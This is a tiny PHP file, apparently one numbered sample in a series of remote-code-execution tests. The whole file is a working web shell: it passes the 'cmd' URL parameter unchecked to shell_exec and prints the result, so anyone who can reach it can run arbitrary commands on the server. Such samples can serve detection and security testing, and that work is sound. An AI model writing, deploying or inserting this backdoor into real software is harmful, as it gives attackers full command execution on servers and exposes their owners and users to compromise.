<?php
// RCE test variation #686
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>